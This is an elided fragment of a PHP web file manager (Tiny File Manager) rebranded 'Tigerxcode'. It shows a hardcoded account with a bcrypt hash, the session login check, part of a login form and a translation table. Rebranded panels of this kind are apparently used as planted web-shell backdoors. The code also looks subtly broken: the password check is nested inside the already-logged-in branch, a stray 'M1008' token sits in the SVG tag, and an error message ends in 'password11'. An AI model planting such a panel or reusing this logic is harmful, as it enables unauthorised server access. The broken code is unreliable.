...
$auth_users = array(
    'Tigerxcode' => '$2y$10$.rZpAD.I55S9Rx9Ug70yruDrFQh/iLble1rwTYDWVhGjUV5tPLlnq', //
);
...
if ($use_auth) {
    if (isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_ID]['logged']])) {
        ...
        if(function_exists('password_verify')) {
            if (isset($_POST['fm_pwd']) && password_verify($_POST['fm_pwd'], $auth_users['Tigerxcode'])) {
                $_SESSION[FM_SESSION_ID]['logged'] = 'Tigerxcode';
                fm_set_msg(lng('You are logged in'));
                fm_redirect(FM_SELF_URL . '?p=');
            } else {
                unset($_SESSION[FM_SESSION_ID]['logged']);
                fm_set_msg(lng('Login failed. Invalid username or password11'), 'error');
                fm_redirect(FM_SELF_URL);
            }
        } else {
                            ...
                            <div class="card-body">
                                <form class="form-signin" action="" method="post" autocomplete="off">
                                    <div class="form-group">
                                       <div class="brand">
                                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" M1008 width="100%" height="80px" viewBox="0 0 238.000000 140.000000" aria-label="Tigerxcode">
...
function lng($txt) {
    ...
    // English Language
    $tr['en']['AppName']        = 'Tiny File Manager';      $tr['en']['AppTitle']           = 'Tigerxcode';
